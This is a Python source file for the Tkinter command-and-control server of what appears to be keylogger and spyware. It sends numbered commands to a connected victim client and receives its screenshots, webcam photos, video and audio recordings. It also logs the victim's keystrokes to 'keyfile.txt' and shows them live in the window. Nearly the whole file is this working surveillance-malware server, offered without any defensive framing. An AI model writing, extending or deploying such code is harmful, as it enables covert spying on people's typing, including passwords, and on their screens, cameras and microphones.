import tkinter as tk
import socket
import threading
from tkinter import messagebox
from PIL import Image, ImageTk
import cv2
#import pygame

enter_message=""
messagedata=["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]
backspace=0
datacount=0
def check_keyReceived(key):
    if key=="Key.enter":
        return "\n"
    elif key=="Key.space":
        return " "
    elif key=="Key.tab":
        return "    "
    elif key=="Key.backspace":
        return "'BACKSPACE'"
    else:
        return key

class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Server GUI")
        
        self.label = tk.Label(root, text="Server Status: Not Running")
        self.label.pack(pady=10)
        
        self.start_button = tk.Button(root, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=5)
        
        self.stop_button = tk.Button(root, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=5)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.server_socket = None
        self.running = False

    def start_server(self):
        global messagedata
        self.running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        self.label.config(text="Server Status: Running")
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('localhost', 8889))
        self.server_socket.listen(5)
        threading.Thread(target=self.accept_connections).start()
        

    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, client_address)).start()
            except OSError:
                break

    def handle_client(self, client_socket, client_address):
        print(f"Accepted connection from {client_address}")

        # Your existing handle_client logic goes heresend_messages
        
        def imageview(name):
            image_window = tk.Toplevel()
            image_window.title("Image Viewer")
            image = Image.open(name)  # Replace "example.jpg" with your image file path
            #image = image.resize((400, 200),Image.BICUBIC)

            # Create PhotoImage object to hold the image
            photo = ImageTk.PhotoImage(image)

            # Create label widget to display the image
            label = tk.Label(image_window, image=photo)
            label.image = photo
            label.pack()

        
        def video_view(name):
            video_window = tk.Toplevel()
            video_window.title("Video Viewer")

            # Open the video file
            cap = cv2.VideoCapture(name)

            # Get the width and height of the video
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

            # Create a canvas to display the video
            canvas = tk.Canvas(video_window, width=width, height=height)
            canvas.pack()

            # Function to update the video frames
            def update():
                ret, frame = cap.read()
                if ret:
                    # Convert the frame from BGR to RGB
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    # Convert the frame to ImageTk format
                    img = ImageTk.PhotoImage(image=Image.fromarray(frame))
                    # Display the frame on the canvas
                    canvas.create_image(0, 0, anchor=tk.NW, image=img)
                    # Update the canvas
                    canvas.img = img
                    canvas.after(10, update)  # Update every 10 milliseconds (100 frames per second)
                else:
                    # Release the video capture object
                    cap.release()

            # Start updating the video frames
            update()



        """def play_wav(file_path):
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()"""



        def receive_messages():
            while True:
                #send_messages()
                datatype= client_socket.recv(1) #first send datatype and then send data
                print("Data is",datatype)
            
           
                    #receive image file
                if datatype==b'I':
                    #print("It is image")
                    image_size_bytes = client_socket.recv(4)
                    image_size = int.from_bytes(image_size_bytes, byteorder='big')
                    image_data = client_socket.recv(image_size)
                    if enter_message=="2":
                        with open("screenshot.png", 'wb') as file:
                            file.write(image_data)
                        imageview("screenshot.png")
                        

                        
                    elif enter_message=="3":
                        with open("photo.jpg", 'wb') as file:
                            file.write(image_data) 
                        imageview("photo.jpg")
                    elif enter_message=="4":
                        with open("video.avi", 'wb') as file:
                            file.write(image_data)
                        video_view("video.avi")
                        
                    elif enter_message=="5":
                        with open("audio.wav", 'wb') as file:
                            file.write(image_data)
                        #play_wav("audio.wav")

                    
                else:#receive text file
                    
                    data= client_socket.recv(1024).decode().strip("'")
                    data=check_keyReceived(data)
                    if not data:
                        break
                    with open("keyfile.txt",'a') as logKey:
                        try:
            
                            logKey.write(data)
                            print("\nSaved:",data)
                        except:
                            print("File Save Error")

                    count=1
                    c=len(messagedata)-1
                    datamessage=""
                    global datacount
                    if data=="'BACKSPACE'":
                        print("Index",-datacount-1)
                        while c>0:
                            messagedata[c]=messagedata[c-1]
                            c=c-1
                        if datacount<40:
                            messagedata[-datacount-1]=""
                        
                        
                        if datacount>0:

                            datacount=datacount-1
                    else:
                        
                        #backspace=0
                        while count<len(messagedata):
                            messagedata[count-1]=messagedata[count]
                            count=count+1

                        messagedata[-1]=data 
                        if datacount<40:
                            datacount=datacount+1
                        
                       
                    for j in messagedata:
                        datamessage+=j
                    self.label.config(text=f"{datamessage}")
                    



                #self.label.config(text=f"Received from {client_address}: {data}")
                print(f"Received from {client_address}: {data}")

        def send_messages():
            
            while True:
                global enter_message
                enter_message = input("Server: Enter message to send:")
                client_socket.sendall(enter_message.encode())
           
        
        # Start threads for sending and receiving messages
        receive_thread = threading.Thread(target=receive_messages)
        send_thread = threading.Thread(target=send_messages)

        receive_thread.start()
        send_thread.start()

        receive_thread.join()
        send_thread.join()

        

























        
        client_socket.close()
        print(f"Connection from {client_address} closed")

    def stop_server(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.label.config(text="Server Status: Not Running")
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.stop_server()
            self.root.destroy()
    

if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()
